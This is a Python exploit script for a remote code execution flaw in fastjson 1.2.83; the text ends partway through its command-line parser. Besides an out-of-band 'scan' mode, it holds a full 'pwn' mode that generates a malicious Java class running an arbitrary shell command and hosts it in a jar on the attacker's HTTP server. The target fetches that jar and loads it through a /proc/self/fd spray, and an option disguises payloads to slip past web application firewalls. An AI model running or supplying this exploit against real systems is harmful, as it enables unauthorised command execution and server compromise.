#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
fastjson 1.2.83 `jar:` protocol RCE — detection + full exploitation
(single file, standard library + requests/cryptography)

Exploits fastjson 1.2.83 (autoType disabled by default, no safeMode) by abusing the
JVM's `jar:` protocol to remotely load and instantiate an arbitrary class. Two subcommands:

  * scan  — pure out-of-band (OOB) detection: only probes, never executes code. A
            jar:http:// @type forces the target to download the jar before any class-name
            validation; if interactsh receives the callback, the target is vulnerable.
  * pwn   — full exploitation (real RCE): builds, in pure Python, a malicious class whose
            this_class is a `jar:` URL (annotated with @JSONType, so no expectClass and no
            inheritance are required), packs it into a jar and hosts it over a built-in HTTP
            server, then sends stage-1 (download) + stage-2 (/proc/self/fd spray) to run a command.

How it works:
  While handling any @type, fastjson's checkAutoType first runs an @JSONType probe
  (getResourceAsStream). When @type is `jar:http://<decIP>:<port>/<name>!/<entry>`, the JVM
  opens that URL and downloads the jar over HTTP before any class-name validation / loadClass.
  This OOB request fires across all JDK/container combinations, so `scan` relies on it for
  harmless detection. To actually execute code, the downloaded jar is cached at `/proc/self/fd/N`;
  stage-2 uses `jar:file:/proc/self/fd/N!/<entry>N` (all single-slash, passes class-name checks
  on JDK 9+) to define and instantiate the malicious class, triggering the Runtime.exec in its
  static block / constructor. Because fastjson replaces `.` with `/` when building the URL, the
  attacker IP must be given as a dot-free decimal integer.

Dependencies:
  pip install requests cryptography      # cryptography is only needed by scan

Examples:
  # Full exploitation (two-stage, works on any container/JDK):
  python3 poc.py pwn -t http://127.0.0.1:8090/ -l <your-ip> -c 'id > /tmp/success'
  # Pure out-of-band detection:
  python3 poc.py scan -o http://203.0.113.10:50050 -t http://127.0.0.1:8090/
"""

import argparse
import base64
import ipaddress
import json
import os
import re
import secrets
import socketserver
import struct
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse

import requests

# Targets may use self-signed / expired certificates; skip TLS verification and silence the warning.
requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]

VERSION = "2.0.0"


# --------------------------------------------------------------------------- #
# Colored output: auto-disabled on non-TTY or when NO_COLOR is set
# --------------------------------------------------------------------------- #
def _enable_windows_ansi() -> None:
    if os.name == "nt":
        try:
            import ctypes

            kernel32 = ctypes.windll.kernel32  # type: ignore[attr-defined]
            # ENABLE_PROCESSED_OUTPUT(1) | ENABLE_VIRTUAL_TERMINAL_PROCESSING(4)
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except Exception:
            pass


_enable_windows_ansi()
USE_COLOR = (os.environ.get("NO_COLOR", "") == "") and sys.stdout.isatty()


def _colorize(code: str, s: str) -> str:
    if not USE_COLOR:
        return s
    return "\x1b[" + code + "m" + s + "\x1b[0m"


def red(s: str) -> str:
    return _colorize("31", s)


def green(s: str) -> str:
    return _colorize("32;1", s)


def yellow(s: str) -> str:
    return _colorize("33", s)


def cyan(s: str) -> str:
    return _colorize("36", s)


# --------------------------------------------------------------------------- #
# Duration parsing: turn "8s"/"25s"/"500ms"/"1m30s" and the like into seconds
# --------------------------------------------------------------------------- #
_DUR_UNITS = {"ns": 1e-9, "us": 1e-6, "µs": 1e-6, "ms": 1e-3, "s": 1.0, "m": 60.0, "h": 3600.0}
_DUR_RE = re.compile(r"(\d+(?:\.\d+)?)(ns|us|µs|ms|s|m|h)")


def parse_duration(text: str) -> float:
    s = text.strip()
    if s == "" or s == "0":
        return 0.0
    matches = _DUR_RE.findall(s)
    if matches and "".join(a + b for a, b in matches) == s:
        return sum(float(val) * _DUR_UNITS[unit] for val, unit in matches)
    try:  # allow a bare number, interpreted as seconds
        return float(s)
    except ValueError:
        raise argparse.ArgumentTypeError(f"invalid duration: {text!r}")


def _fmt_dur(seconds: float) -> str:
    if seconds == int(seconds):
        return f"{int(seconds)}s"
    return f"{seconds}s"


# --------------------------------------------------------------------------- #
# Random lowercase alphanumeric string
# --------------------------------------------------------------------------- #
_ALNUM = "abcdefghijklmnopqrstuvwxyz0123456789"


def rand_alnum(n: int) -> str:
    # Lowercase matters: the server lowercases seen ids before matching, so we poll with a lowercase key.
    return "".join(secrets.choice(_ALNUM) for _ in range(n))


# Must match the server defaults (pkg/settings): id 20 + nonce 13 = 33.
CORRELATION_ID_LEN = 20
NONCE_LEN = 13


# --------------------------------------------------------------------------- #
# IP / @type helpers — the jar: trick needs a dot-free host (decimal integer),
# because fastjson replaces every `.` with `/`.
# --------------------------------------------------------------------------- #
def to_decimal_ip(host: str) -> str:
    """Dotted-quad IPv4 -> decimal integer string; a pure-digit input is returned as-is; else raises ValueError."""
    if host.isdigit():
        return host
    ip = ipaddress.ip_address(host)  # raises ValueError
    if ip.version != 4:
        raise ValueError(f"not an IPv4 address: {host}")
    return str(int(ip))


def decimal_host_port(base: str):
    """Turn http://1.2.3.4:8000 into ("16909060", "8000")."""
    b = base
    for pre in ("http://", "https://"):
        if b.startswith(pre):
            b = b[len(pre):]
            break
    if ":" not in b:
        raise ValueError(f"oob host must be host:port: {base!r}")
    host, port = b.rsplit(":", 1)
    return to_decimal_ip(host), port


def http_internal(dec_ip: str, port, name: str, entry: str) -> str:
    """stage-1 class internal name (slash form): jar:http://<decIP>:<port>/<name>!/<entry>"""
    return f"jar:http://{dec_ip}:{port}/{name}!/{entry}"


def file_internal(entry: str, n: int) -> str:
    """stage-2 class internal name (slash form): jar:file:/proc/self/fd/<N>!/<entry>N"""
    return f"jar:file:/proc/self/fd/{n}!/{entry}{n}"


def dot_type(slash_internal_name: str) -> str:
    """Slash-form URL internal name -> the dot form used in the fastjson @type (fastjson maps . -> / again)."""
    return slash_internal_name.replace("/", ".")


# --------------------------------------------------------------------------- #
# Pure-Python Java class generator — no javac / ASM / fastjson jar required
#
# Emits a class where:
#   * this_class internal name = the given `jar:` URL (slash form), matching the dot-form @type;
#   * the class carries @com.alibaba.fastjson.annotation.JSONType (checkAutoType's jsonType branch
#     passes it, so no expectClass and no inheritance from the target class are needed);
#   * both <clinit> and <init> call run(), which runs Runtime.getRuntime().exec({"/bin/sh","-c",cmd});
#   * class version 50 (Java 6), branchless => no StackMapTable, loadable on JDK 8~21.
# The JVM does not enforce checked exceptions, so try/catch is omitted.
# --------------------------------------------------------------------------- #
class _CP:
    """Constant-pool builder (with automatic de-duplication)."""

    def __init__(self):
        self.entries = []
        self.cache = {}

    def _add(self, key, raw):
        if key in self.cache:
            return self.cache[key]
        self.entries.append(raw)
        idx = len(self.entries)  # constant-pool indices start at 1
        self.cache[key] = idx
        return idx

    def utf8(self, s):
        b = s.encode("utf-8")
        return self._add(("u", s), b"\x01" + struct.pack(">H", len(b)) + b)

    def integer(self, v):
        return self._add(("i", v), b"\x03" + struct.pack(">i", v))

    def cls(self, name):
        return self._add(("c", name), b"\x07" + struct.pack(">H", self.utf8(name)))

    def string(self, s):
        return self._add(("s", s), b"\x08" + struct.pack(">H", self.utf8(s)))

    def nat(self, name, desc):
        return self._add(("n", name, desc), b"\x0c" + struct.pack(">HH", self.utf8(name), self.utf8(desc)))

    def methodref(self, cls, name, desc):
        return self._add(("m", cls, name, desc),
                         b"\x0a" + struct.pack(">HH", self.cls(cls), self.nat(name, desc)))

    def to_bytes(self):
        return struct.pack(">H", len(self.entries) + 1) + b"".join(self.entries)


def gen_class(internal_name: str, cmd: str) -> bytes:
    cp = _CP()
    this_c = cp.cls(internal_name)
    obj_c = cp.cls("java/lang/Object")
    code_u = cp.utf8("Code")
    init_n = cp.utf8("<init>")
    void_d = cp.utf8("()V")
    clinit_n = cp.utf8("<clinit>")
    run_n = cp.utf8("run")
    obj_init = cp.methodref("java/lang/Object", "<init>", "()V")
    run_ref = cp.methodref(internal_name, "run", "()V")
    getrt = cp.methodref("java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;")
    execm = cp.methodref("java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;")
    strcls = cp.cls("java/lang/String")
    s0 = cp.string("/bin/sh")
    s1 = cp.string("-c")
    scmd = cp.string(cmd)
    ann_type = cp.utf8("Lcom/alibaba/fastjson/annotation/JSONType;")
    rva = cp.utf8("RuntimeVisibleAnnotations")
    asm_name = cp.utf8("asm")
    false_int = cp.integer(0)

    def code_attr(max_stack, max_locals, code):
        body = struct.pack(">HH", max_stack, max_locals) + struct.pack(">I", len(code)) + code
        body += struct.pack(">H", 0)  # exception_table_length
        body += struct.pack(">H", 0)  # attributes_count
        return struct.pack(">H", code_u) + struct.pack(">I", len(body)) + body

    def method(flags, name_i, desc_i, ca):
        return struct.pack(">HHH", flags, name_i, desc_i) + struct.pack(">H", 1) + ca

    # <init>: aload_0; invokespecial Object.<init>; invokestatic run; return
    init_code = (b"\x2a" + b"\xb7" + struct.pack(">H", obj_init)
                 + b"\xb8" + struct.pack(">H", run_ref) + b"\xb1")
    m_init = method(0x0001, init_n, void_d, code_attr(1, 1, init_code))
    # <clinit>: invokestatic run; return
    clinit_code = b"\xb8" + struct.pack(">H", run_ref) + b"\xb1"
    m_clinit = method(0x0008, clinit_n, void_d, code_attr(1, 0, clinit_code))
    # run(): Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd}); return
    run_code = (
        b"\xb8" + struct.pack(">H", getrt)                          # invokestatic getRuntime
        + b"\x06"                                                   # iconst_3
        + b"\xbd" + struct.pack(">H", strcls)                       # anewarray String
        + b"\x59\x03\x13" + struct.pack(">H", s0) + b"\x53"         # dup iconst_0 ldc_w aastore
        + b"\x59\x04\x13" + struct.pack(">H", s1) + b"\x53"         # dup iconst_1 ldc_w aastore
        + b"\x59\x05\x13" + struct.pack(">H", scmd) + b"\x53"       # dup iconst_2 ldc_w aastore
        + b"\xb6" + struct.pack(">H", execm)                        # invokevirtual exec
        + b"\x57"                                                   # pop
        + b"\xb1"                                                   # return
    )
    m_run = method(0x0008, run_n, void_d, code_attr(5, 0, run_code))

    # @JSONType(asm = false):
    #   asm=false forces fastjson to use the reflection deserializer (clazz.newInstance()) instead of
    #   its ASM-generated one. The ASM createInstance would do `new <jar:URL name>()`, re-resolving this
    #   bizarre class name through ASMClassLoader -> ClassNotFoundException -> NoClassDefFoundError, so
    #   <clinit> never runs; the reflection path calls newInstance on the already-resolved Class object,
    #   initializing it -> <clinit> -> command execution.
    annotation = (struct.pack(">H", ann_type) + struct.pack(">H", 1)      # type, 1 element pair
                  + struct.pack(">H", asm_name) + b"Z" + struct.pack(">H", false_int))  # asm = (boolean)0
    class_ann = (struct.pack(">H", rva) + struct.pack(">I", 2 + len(annotation))
                 + struct.pack(">H", 1) + annotation)

    out = b"\xca\xfe\xba\xbe" + struct.pack(">HH", 0, 50)   # magic + minor/major (Java 6)
    out += cp.to_bytes()
    out += struct.pack(">H", 0x21)      # access_flags: ACC_PUBLIC | ACC_SUPER
    out += struct.pack(">H", this_c)
    out += struct.pack(">H", obj_c)
    out += struct.pack(">H", 0)         # interfaces_count
    out += struct.pack(">H", 0)         # fields_count
    out += struct.pack(">H", 3)         # methods_count
    out += m_init + m_clinit + m_run
    out += struct.pack(">H", 1)         # class attributes_count
    out += class_ann
    return out


def _jar_bytes(entries) -> bytes:
    """Pack {name: class_bytes} into an (uncompressed) jar/zip."""
    import io
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
        for name, data in entries.items():
            zf.writestr(name, data)
    return buf.getvalue()


def build_probe_jar(dec_ip: str, port, name: str, entry: str, cmd: str,
                    spray: bool, fd_low: int, fd_high: int) -> bytes:
    """Build the probe jar:
       - stage-1 entry <entry>.class, internal name = jar:http URL (triggers the download);
       - in spray mode, also append <entry>N.class, internal name = jar:file:/proc/self/fd/N!/<entry>N.
    """
    entries = {entry + ".class": gen_class(http_internal(dec_ip, port, name, entry), cmd)}
    if spray:
        for n in range(fd_low, fd_high):
            entries[f"{entry}{n}.class"] = gen_class(file_internal(entry, n), cmd)
    return _jar_bytes(entries)


# --------------------------------------------------------------------------- #
# Built-in HTTP server — returns the same probe jar for any path
# --------------------------------------------------------------------------- #
class _JarServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def serve_jar(port: int, jar: bytes, verbose: bool) -> _JarServer:
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/java-archive")
            self.send_header("Content-Length", str(len(jar)))
            self.end_headers()
            try:
                self.wfile.write(jar)
            except (BrokenPipeError, ConnectionResetError):
                pass
            if verbose:
                print(f"{cyan('[http]')} served jar ({len(jar)} B) to "
                      f"{self.client_address[0]} GET {self.path}")

        def log_message(self, *args):
            pass  # silence the default access log

    httpd = _JarServer(("0.0.0.0", port), Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd


# --------------------------------------------------------------------------- #
# interactsh client (OOB detection)
# --------------------------------------------------------------------------- #
class InteractshError(Exception):
    pass


class InteractshClient:
    """Minimal interactsh client: register, poll, and decrypt HTTP interactions (path-based correlation)."""

    def __init__(self, oob_url: str, timeout: float):
        u = urlparse(oob_url)
        if not u.scheme or not u.netloc:
            raise InteractshError(f"invalid oob url {oob_url!r}")
        self.base = f"{u.scheme}://{u.netloc}"
        self.corr_id = rand_alnum(CORRELATION_ID_LEN)  # 20 chars, the polling key
        self.secret = rand_alnum(32)
        from cryptography.hazmat.primitives.asymmetric import rsa
        self.priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        self.timeout = timeout
        self.session = requests.Session()  # kept separate from target traffic; never proxied

    def new_name(self) -> str:
        """Return `<correlationID><fresh-nonce>` — a 33-char token embedded in the payload path."""
        return self.corr_id + rand_alnum(NONCE_LEN)

    def _encode_public_key(self) -> str:
        from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
        # The server labels the PEM block "RSA PUBLIC KEY" but stores PKIX (SubjectPublicKeyInfo) bytes.
        der = self.priv.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
        b64 = base64.b64encode(der).decode("ascii")
        lines = [b64[i: i + 64] for i in range(0, len(b64), 64)]
        pem = "-----BEGIN RSA PUBLIC KEY-----\n" + "\n".join(lines) + "\n-----END RSA PUBLIC KEY-----\n"
        return base64.b64encode(pem.encode("ascii")).decode("ascii")

    def register(self) -> None:
        body = {
            "public-key": self._encode_public_key(),
            "secret-key": self.secret,
            "correlation-id": self.corr_id,
        }
        resp = self.session.post(
            self.base + "/register", json=body, timeout=self.timeout,
            headers={"Content-Type": "application/json"},
        )
        if resp.status_code != 200:
            raise InteractshError(f"register failed: {resp.status_code}: {resp.text.strip()}")
        try:
            msg = resp.json().get("message")
        except ValueError:
            msg = None
        if msg != "registration successful":
            raise InteractshError(f"unexpected register response: {resp.text.strip()}")

    def poll(self):
        url = f"{self.base}/poll?id={self.corr_id}&secret={self.secret}"
        resp = self.session.get(url, timeout=self.timeout)
        if resp.status_code != 200:
            raise InteractshError(f"poll failed: {resp.status_code}: {resp.text.strip()}")
        try:
            pr = resp.json()
        except ValueError as e:
            raise InteractshError(f"decode poll response: {e}")

        out = []
        aes_key = pr.get("aes_key") or ""
        for d in pr.get("data") or []:
            try:
                plain = self._decrypt(aes_key, d)
            except Exception:
                continue  # one bad record must not drop the whole batch
            try:
                it = json.loads(plain.strip())
            except (ValueError, UnicodeDecodeError):
                continue
            if isinstance(it, dict):
                out.append(it)
        # extra / tlddata are plaintext JSON
        for s in (pr.get("extra") or []) + (pr.get("tlddata") or []):
            if not s:
                continue
            try:
                it = json.loads(s)
            except (ValueError, TypeError):
                continue
            if isinstance(it, dict):
                out.append(it)
        return out

    def deregister(self) -> None:
        body = {"correlation-id": self.corr_id, "secret-key": self.secret}
        try:
            self.session.post(
                self.base + "/deregister", json=body, timeout=self.timeout,
                headers={"Content-Type": "application/json"},
            )
        except requests.RequestException:
            pass

    def _decrypt(self, aes_key_b64: str, msg_b64: str) -> bytes:
        # Reverse the server's AES-256-CTR-over-RSA-OAEP(SHA256) scheme.
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import padding
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        wrapped = base64.b64decode(aes_key_b64)
        key = self.priv.decrypt(
            wrapped,
            padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None),
        )
        ct = base64.b64decode(msg_b64)
        if len(ct) < 16:
            raise ValueError("ciphertext too short")
        iv, data = ct[:16], ct[16:]
        cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
        dec = cipher.decryptor()
        return dec.update(data) + dec.finalize()


# --------------------------------------------------------------------------- #
# Ghost Bits: \u-escape with fullwidth glyphs to evade signature-based WAFs
# --------------------------------------------------------------------------- #
def ghost_hex_digit(n: int) -> str:
    # Fullwidth digits ０-９ (U+FF10) stand for 0-9; fullwidth letters ａ-ｆ (U+FF41) stand for 10-15.
    if n < 10:
        return chr(0xFF10 + n)
    return chr(0xFF41 + (n - 10))


def ghost_escape(s: str) -> str:
    # Encode each char as \u + four fullwidth hex glyphs. Only evades signature matching, not safeMode.
    out = []
    for ch in s:
        code = ord(ch)
        out.append("\\u")
        for shift in (12, 8, 4, 0):
            out.append(ghost_hex_digit((code >> shift) & 0xF))
    return "".join(out)


def build_body(at_type: str, ghost: bool) -> bytes:
    """Build the JSON body to send: `{"@type":"<at_type>","x":1}`; in ghost mode the key and value are \\u fullwidth-encoded."""
    if ghost:
        key = ghost_escape("@type")
        val = ghost_escape(at_type)
    else:
        key = "@type"
        val = at_type
    return ('{"' + key + '":"' + val + '","x":1}').encode("utf-8")


def parse_proxy(s: str):
    """Normalize a proxy string. A bare host:port defaults to http; explicit http/https is passed through."""
    if "://" not in s:
        s = "http://" + s
    u = urlparse(s)
    if not u.hostname:
        raise ValueError(f"proxy has no host: {s!r}")
    return u.scheme, u.netloc, f"{u.scheme}://{u.netloc}"


# --------------------------------------------------------------------------- #
# Small helpers
# --------------------------------------------------------------------------- #
def clip(s: str, n: int) -> str:
    if len(s) <= n:
        return s
    return s[:n] + "…"


def first_line(s: str) -> str:
    for i, ch in enumerate(s):
        if ch in "\r\n":
            return s[:i]
    return s


def snippet(body: str) -> str:
    if not body:
        return ""
    b = re.sub(r"\s+", " ", body).strip()
    return b[:120] + "…" if len(b) > 120 else b


def load_targets(single, file):
    out = list(single or [])
    if file:
        with open(file, "r", encoding="utf-8") as f:
            for ln in f.read().split("\n"):
                ln = ln.strip()
                if ln and not ln.startswith("#"):
                    out.append(ln)
    return out


def parse_headers(items):
    """Parse repeated `-H "Name: Value"` into a dict — for carrying Cookie/Authorization etc."""
    headers = {}
    for raw in items or []:
        name, sep, value = raw.partition(":")
        name = name.strip()
        if not sep or not name:
            raise ValueError(f"invalid header (want 'Name: Value'): {raw!r}")
        headers[name] = value.lstrip()
    return headers


def http_post(session, url, body, headers, timeout, proxies):
    hdrs = {"Content-Type": "application/json"}
    hdrs.update(headers or {})
    return session.post(url, data=body, headers=hdrs, timeout=timeout,
                        proxies=proxies, verify=False, allow_redirects=False)


# --------------------------------------------------------------------------- #
# scan: pure out-of-band detection (probe only, no execution)
# --------------------------------------------------------------------------- #
def send_probe(session, url, body, headers, timeout, proxies, verbose):
    try:
        http_post(session, url, body, headers, timeout, proxies)
    except requests.RequestException as e:
        if verbose:
            print(f"{yellow('[!]')} send {url}: {e}")


def run_scan(cfg) -> int:
    c = InteractshClient(cfg["oob"], cfg["timeout"])
    try:
        dec_ip, port = decimal_host_port(c.base)
    except ValueError as e:
        raise SystemExit(
            f"{red('error:')} oob host must be an IPv4 (jar: trick needs a dot-free host): {e}"
        )

    c.register()
    print(
        f"{cyan('[*]')} registered with {c.base}  "
        f"(correlationID={c.corr_id}, oob={dec_ip}:{port})"
    )
    try:
        proxies = None
        if cfg["proxy"]:
            scheme, netloc, norm = parse_proxy(cfg["proxy"])
            proxies = {"http": norm, "https": norm}
            print(f"{cyan('[*]')} target traffic via proxy {norm}")
        target_session = requests.Session()

        tasks = {}   # name -> target URL
        labels = []
        for tgt in cfg["targets"]:
            name = c.new_name()
            at_type = dot_type(http_internal(dec_ip, port, name, cfg["entry"]))
            body = build_body(at_type, cfg["ghost"])
            tasks[name] = tgt
            labels.append(tgt)
            if cfg["verbose"]:
                print(f"{cyan('[>]')} {tgt}  @type={at_type}")
                print(f"    body: {clip(body.decode('utf-8', 'replace'), 240)}")
            send_probe(target_session, tgt, body, cfg["headers"], cfg["timeout"], proxies, cfg["verbose"])
        print(
            f"{cyan('[*]')} sent {len(labels)} probe(s); polling "
            f"{_fmt_dur(cfg['wait'])} for callbacks..."
        )

        confirmed = {}
        deadline = time.monotonic() + cfg["wait"]
        while True:
            try:
                its = c.poll()
            except InteractshError as e:
                its = []
                if cfg["verbose"]:
                    print(f"{yellow('[!]')} poll: {e}")
            for it in its:
                uid = str(it.get("unique-id", ""))
                label = tasks.get(uid.lower())
                if label is None or confirmed.get(uid):
                    continue
                confirmed[uid] = True
                print(f"\n{green('[+] VULNERABLE')} {label}")
                print(f"    via {it.get('protocol')} callback from {it.get('remote-address')}")
                line = first_line(it.get("raw-request", "") or "")
                if line:
                    print(f"    request: {line}")
            if time.monotonic() > deadline:
                break
            time.sleep(cfg["interval"])

        vuln = {}
        for uid in confirmed:
            vuln[tasks[uid]] = True
        print(f"\n{cyan('[*]')} done: {len(vuln)}/{len(labels)} probe(s) vulnerable")
        for label in labels:
            if vuln.get(label):
                print(f"    {green('VULNERABLE')}  {label}")
            else:
                print(f"    no callback  {label}")
        return len(vuln)
    finally:
        c.deregister()


# --------------------------------------------------------------------------- #
# pwn: full exploitation (actually runs the command)
# --------------------------------------------------------------------------- #
def run_pwn(cfg) -> int:
    try:
        dec_ip = to_decimal_ip(cfg["lhost"])
    except ValueError as e:
        print(f"{red('error:')} lhost must be a dotted-quad IPv4 or a decimal integer "
              f"(a hostname with letters breaks the jar: trick, which turns dots into slashes): {e}",
              file=sys.stderr)
        return 2
    if dec_ip != cfg["lhost"]:
        print(f"{cyan('[*]')} lhost {cfg['lhost']} -> decimal {dec_ip}")

    # fastjson caches loaded classes in a static global `mappings` (keyed by the @type string). To avoid
    # hitting a stale class (old command) from a previous run against a JVM that was not restarted, each
    # run appends a random suffix to `entry` so the stage-1/stage-2 @type values are unique. An explicit
    # --entry is respected.
    entry = cfg["entry"] or ("POC" + rand_alnum(4))
    cfg["entry"] = entry
    url = cfg["target"]
    jar = build_probe_jar(dec_ip, cfg["lport"], cfg["name"], cfg["entry"], cfg["cmd"],
                          True, cfg["fd_low"], cfg["fd_high"])
    print(f"{green('[+]')} built probe jar: {len(jar)} bytes, "
          f"spray {cfg['fd_high'] - cfg['fd_low']} fd classes, cmd=[{cfg['cmd']}]")

    try:
        httpd = serve_jar(cfg["lport"], jar, cfg["verbose"])
    except OSError as e:
        print(f"{red('error:')} cannot listen on 0.0.0.0:{cfg['lport']}: {e}", file=sys.stderr)
        return 2
    print(f"{green('[+]')} hosting jar on 0.0.0.0:{cfg['lport']} (any path returns this jar)")

    session = requests.Session()
    # Size the connection pool to the spray concurrency so stage-2 threads reuse sockets instead of
    # exhausting the default pool (which would serialize them and print urllib3 pool-full warnings).
    pool = max(1, cfg["concurrency"])
    adapter = requests.adapters.HTTPAdapter(pool_connections=pool, pool_maxsize=pool)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    timeout = cfg["timeout"]
    try:
        # ---------- stage 1: trigger the download ----------
        http_dot = dot_type(http_internal(dec_ip, cfg["lport"], cfg["name"], cfg["entry"]))
        print(f"{cyan('[*]')} STAGE 1 -> {url}  downloading {http_dot}")
        try:
            r1 = http_post(session, url, build_body(http_dot, cfg["ghost"]), cfg["headers"], timeout, None)
            print(f"{cyan('[*]')}   response {r1.status_code} {snippet(r1.text)}")
        except requests.RequestException as e:
            print(f"{yellow('[!]')}   stage1 request error (the download side effect may still have happened): {e}")

        # ---------- stage 2: /proc/self/fd blind spray ----------
        # The jar downloaded in stage 1 is cached by URLClassLoader as a `/tmp/jar_cache*.tmp (deleted)`
        # file, exposed as some /proc/self/fd/N. We do not know N (observed ~33 in this environment), so we
        # walk a range of fds, trying jar:file:/proc/self/fd/N!/<entry>N (all single-slash, passes class-name
        # checks on every JDK) one by one; hitting the real N defines + instantiates the malicious class ->
        # static/<init> runs the command.
        # Note: a hit cannot be told from the HTTP response — with an expectClass entry like @RequestBody User,
        # the command runs but the returned object is not the expected bean and errors out. So this is a blind
        # spray whose result must be verified out of band.
        lo, hi = cfg["fd_low"], cfg["fd_high"]
        total = hi - lo
        workers = max(1, cfg["concurrency"])
        print(f"{cyan('[*]')} STAGE 2 -> spraying fd [{lo},{hi}) blindly with {workers} concurrent workers "
              f"(the downloaded jar is cached at some /proc/self/fd/N; hitting it defines+instantiates "
              f"the malicious class -> runs the command)")
        # The spray is intentionally blind: because a hit cannot be told apart from a miss on every
        # target (many apps hide the exception, return a generic error page, or sit behind a WAF), we
        # do not parse responses to stop early. The fd probes are independent, so we just fire the whole
        # range concurrently to cut wall-clock time; hitting the cached fd runs the command regardless.
        done = 0
        lock = threading.Lock()

        def spray_one(n):
            nonlocal done
            file_dot = dot_type(file_internal(cfg["entry"], n))
            try:
                http_post(session, url, build_body(file_dot, cfg["ghost"]), cfg["headers"], timeout, None)
            except requests.RequestException:
                pass
            if USE_COLOR:
                with lock:
                    done += 1
                    sys.stdout.write(f"\r{cyan('[*]')} sprayed {done}/{total} fd requests   ")
                    sys.stdout.flush()

        with ThreadPoolExecutor(max_workers=workers) as ex:
            list(ex.map(spray_one, range(lo, hi)))
        if USE_COLOR:
            sys.stdout.write("\n")
        print(f"{green('[+]')} STAGE 2 done: sprayed stage-2 requests over fd [{lo},{hi}); "
              f"if the target is vulnerable, the command [{cfg['cmd']}] has run on it")
        print(f"{cyan('[*]')} verify the result out of band "
              f"(for this environment: `docker compose exec web cat /tmp/success`)")
        return 0
    finally:
        httpd.shutdown()


# --------------------------------------------------------------------------- #
# Command implementations
# --------------------------------------------------------------------------- #
def cmd_scan(args) -> int:
    targets = load_targets(args.target, args.file)
    if not targets:
        print(f"{red('error:')} no targets: pass --target/-t or --file/-f", file=sys.stderr)
        return 1
    try:
        headers = parse_headers(args.header)
    except ValueError as e:
        print(f"{red('error:')} {e}", file=sys.stderr)
        return 1
    cfg = {
        "oob": args.oob, "targets": targets, "headers": headers, "proxy": args.proxy,
        "ghost": args.ghost, "entry": args.entry, "timeout": args.timeout,
        "wait": args.wait, "interval": args.interval, "verbose": args.verbose,
    }
    try:
        vuln = run_scan(cfg)
    except InteractshError as e:
        print(f"{red('error:')} interactsh: {e}", file=sys.stderr)
        return 1
    except (OSError, ValueError) as e:
        print(f"{red('error:')} {e}", file=sys.stderr)
        return 1
    return 1 if vuln > 0 else 0  # non-zero when something is vulnerable, handy for CI/scripts


def cmd_pwn(args) -> int:
    try:
        headers = parse_headers(args.header)
    except ValueError as e:
        print(f"{red('error:')} {e}", file=sys.stderr)
        return 2
    if args.fd_low < 0 or args.fd_high <= args.fd_low:
        print(f"{red('error:')} invalid fd range: [{args.fd_low},{args.fd_high})", file=sys.stderr)
        return 2
    if args.concurrency < 1:
        print(f"{red('error:')} --concurrency must be >= 1", file=sys.stderr)
        return 2
    cfg = {
        "target": args.target, "lhost": args.lhost,
        "lport": args.lport, "name": args.name, "entry": args.entry, "cmd": args.cmd,
        "ghost": args.ghost, "headers": headers,
        "fd_low": args.fd_low, "fd_high": args.fd_high, "timeout": args.timeout,
        "concurrency": args.concurrency, "verbose": args.verbose,
    }
    return run_pwn(cfg)


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="fastjson-1.2.83-poc",
        description="fastjson 1.2.83 jar:-protocol RCE — OOB detector (scan) and full exploit (pwn)",
    )
    parser.add_argument("--version", action="version", version=f"fastjson-1.2.83-poc {VERSION}")
    sub = parser.add_subparsers(dest="command", required=True)

    env_oob = os.environ.get("OOB_URL")

    # ---- pwn (full exploitation) ----
    w = sub.add_parser("pwn", aliases=["p"],
                       help="full exploit: build a jar:-named class, host it, and run a command via RCE")
    w.add_argument("-t", "--target", required=True,
                   help="full target URL incl. path, e.g. http://127.0.0.1:8090/")
    w.add_argument("-l", "--lhost", default="127.0.0.1",
                   help="attacker HTTP host, dotted-quad or decimal (must be reachable by target)")
    w.add_argument("-p", "--lport", type=int, default=8000,
                   help="attacker HTTP port; the script starts a built-in HTTP server on this port to "
                        "host the jar (default 8000)")
    w.add_argument("-c", "--cmd", default="id > /tmp/success",
                   help="command to run via /bin/sh -c (default: id > /tmp/success)")
    w.add_argument("--name", default="probe", help="jar URL path / filename (default probe)")
    w.add_argument("--entry", default=None,
                   help="jar entry base name (default: POC + random suffix, to dodge fastjson's class cache)")
    w.add_argument("--ghost", action="store_true",
                   help="Ghost-Bits: \\u-encode @type with fullwidth digits to evade signature WAFs")
    w.add_argument("-H", "--header", action="append", default=[], metavar="'Name: Value'",
                   help="extra request header, curl-style (repeatable)")
    w.add_argument("--fd-low", type=int, default=10, dest="fd_low", help="fd spray lower bound (default 10)")
    w.add_argument("--fd-high", type=int, default=300, dest="fd_high",
                   help="fd spray upper bound, exclusive (default 300)")
    w.add_argument("--concurrency", type=int, default=16, dest="concurrency",
                   help="number of concurrent stage-2 spray requests (default 16)")
    w.add_argument("--timeout", type=parse_duration, default="8s", metavar="DURATION",
                   help="per-request HTTP timeout (default 8s)")
    w.add_argument("-v", "--verbose", action="store_true", help="print jar-fetch and extra logs")
    w.set_defaults(func=cmd_pwn)

    # ---- scan (OOB detection) ----
    p = sub.add_parser("scan", aliases=["s"],
